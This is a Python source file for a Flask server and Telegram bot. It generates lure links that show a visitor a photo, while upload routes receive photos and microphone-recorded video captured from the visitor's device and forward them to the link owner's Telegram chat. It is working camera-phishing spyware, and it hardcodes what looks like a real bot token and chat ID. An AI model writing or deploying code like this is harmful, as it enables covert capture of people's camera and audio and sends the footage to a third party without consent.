import os
import base64
import uuid
import threading
import logging
from flask import Flask, request, render_template, send_from_directory
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import requests
import waitress

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8818489453:AAH56Vc2bNRKcRjXgx1paBjbuHWamiC-ibs"
OWNER_CHAT_ID = "6464233947"
BASE_URL = os.getenv("BASE_URL", "http://localhost:5000")

app = Flask(__name__)
link_data = {}

# स्टैटिक फोटो सर्व करें
@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory('static', filename)

# मुख्य पेज – केवल आपकी भेजी फोटो दिखाएगा
@app.route('/image/<unique_id>')
def image(unique_id):
    if unique_id not in link_data:
        return "Invalid or expired link.", 404
    photo_url = f"/photos/{link_data[unique_id]['photo']}"
    return render_template('camera.html', unique_id=unique_id, photo_url=photo_url)

# 3 फोटो अपलोड
@app.route('/upload/<unique_id>', methods=['POST'])
def upload_photo(unique_id):
    if unique_id not in link_data:
        return {"status": "error"}, 400
    owner_id = link_data[unique_id]["owner"]
    data = request.get_json()
    if not data or 'image' not in data:
        return {"status": "error"}, 400
    image_b64 = data['image']
    if ',' in image_b64:
        image_b64 = image_b64.split(',')[1]
    image_bytes = base64.b64decode(image_b64)
    temp_file = f"temp_{unique_id}.jpg"
    with open(temp_file, "wb") as f:
        f.write(image_bytes)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(temp_file, 'rb') as photo:
        files = {'photo': photo}
        payload = {'chat_id': owner_id}
        resp = requests.post(url, files=files, data=payload)
    os.remove(temp_file)
    return {"status": "ok"}, 200 if resp.status_code == 200 else 500

# 🎥 वीडियो (माइक के साथ) अपलोड – नया जोड़ा
@app.route('/upload_video/<unique_id>', methods=['POST'])
def upload_video(unique_id):
    if unique_id not in link_data:
        return {"status": "error"}, 400
    owner_id = link_data[unique_id]["owner"]
    if 'video' not in request.files:
        return {"status": "error"}, 400
    video_file = request.files['video']
    temp_file = f"temp_video_{unique_id}.webm"
    video_file.save(temp_file)
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    with open(temp_file, 'rb') as vid:
        files = {'video': vid}
        payload = {'chat_id': owner_id, 'caption': '🎥 Video with Audio'}
        resp = requests.post(url, files=files, data=payload)
    os.remove(temp_file)
    return {"status": "ok"}, 200 if resp.status_code == 200 else 500

@app.route('/health')
def health():
    return "OK", 200

# ---------- Telegram Bot Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send me a photo and I'll give you an image link.")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if str(user.id) != OWNER_CHAT_ID:
        await update.message.reply_text("❌ Only the owner can generate links.")
        return

    try:
        photo_file = await update.message.photo[-1].get_file()
        unique_id = uuid.uuid4().hex[:10]
        os.makedirs("static", exist_ok=True)
        filename = f"{unique_id}.jpg"
        await photo_file.download_to_drive(f"static/{filename}")
        logging.info(f"Photo saved: static/{filename}")

        link_data[unique_id] = {"owner": OWNER_CHAT_ID, "photo": filename}

        web_app_url = f"{BASE_URL}/image/{unique_id}"
        keyboard = [[InlineKeyboardButton("📸 Open Image", web_app=WebAppInfo(url=web_app_url))]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"🔗 {web_app_url}",
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Failed to process photo: {e}")
        await update.message.reply_text("❌ Something went wrong, try another photo.")

def run_bot():
    app_bot = Application.builder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    print("🤖 Bot polling started...")
    app_bot.run_polling()

if __name__ == '__main__':
    flask_thread = threading.Thread(
        target=waitress.serve,
        args=(app,),
        kwargs={'host': '0.0.0.0', 'port': 5000},
        daemon=True
    )
    flask_thread.start()
    print("🌐 Flask server starting in background...")
    run_bot()
